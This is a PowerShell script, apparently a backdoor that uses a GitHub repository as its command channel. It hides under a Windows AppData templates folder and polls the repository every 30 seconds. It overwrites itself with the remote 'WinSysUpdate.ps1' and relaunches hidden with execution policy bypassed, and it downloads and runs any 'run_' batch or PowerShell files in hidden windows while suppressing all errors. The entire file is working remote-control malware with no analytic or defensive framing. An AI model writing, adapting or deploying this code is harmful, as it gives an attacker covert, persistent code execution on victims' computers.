# --- CONFIGURATION ---
$username = "YOUR_GITHUB_USERNAME"
$repo = "YOUR_REPO_NAME"
$targetDir = "$env:APPDATA\Microsoft\Windows\Templates\SystemData"
$myPath = $PSCommandPath # Path to this running script

# Ensure directory exists
if (!(Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory -Force | Out-Null }

while($true) {
    try {
        # 1. SELF-UPDATE CHECK
        $remoteScriptUrl = "https://raw.githubusercontent.com/$username/$repo/main/WinSysUpdate.ps1"
        $remoteContent = Invoke-WebRequest -Uri $remoteScriptUrl -UseBasicParsing -TimeoutSec 10 | Select-Object -ExpandProperty Content
        $localContent = Get-Content $myPath -Raw

        if ($remoteContent -and $remoteContent -ne $localContent) {
            Set-Content -Path $myPath -Value $remoteContent
            # Restart the script to apply changes
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$myPath`"" -WindowStyle Hidden
            exit
        }

        # 2. FETCH OTHER COMMANDS FROM REPO
        $apiUrl = "https://api.github.com/repos/$username/$repo/contents/"
        $files = Invoke-RestMethod -Uri $apiUrl -UseBasicParsing

        foreach ($file in $files) {
            $fileName = $file.name
            $downloadUrl = $file.download_url

            # SYNC: create_...
            if ($fileName -like "create_*") {
                $cleanName = $fileName.Replace("create_", "")
                $localPath = Join-Path $targetDir $cleanName
                $fileData = Invoke-WebRequest -Uri $downloadUrl -UseBasicParsing | Select-Object -ExpandProperty Content
                
                if (!(Test-Path $localPath) -or (Get-Content $localPath -Raw) -ne $fileData) {
                    Set-Content -Path $localPath -Value $fileData
                }
            }

            # EXECUTE: run_...
            if ($fileName -like "run_*") {
                $runPath = Join-Path $targetDir $fileName
                Invoke-WebRequest -Uri $downloadUrl -OutFile $runPath
                
                if ($fileName -like "*.bat") { Start-Process cmd.exe -ArgumentList "/c `"$runPath`"" -WindowStyle Hidden }
                elseif ($fileName -like "*.ps1") { Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$runPath`"" -WindowStyle Hidden }
            }
        }
    } catch { 
        # Stay silent on errors
    }
    Start-Sleep -Seconds 30
}
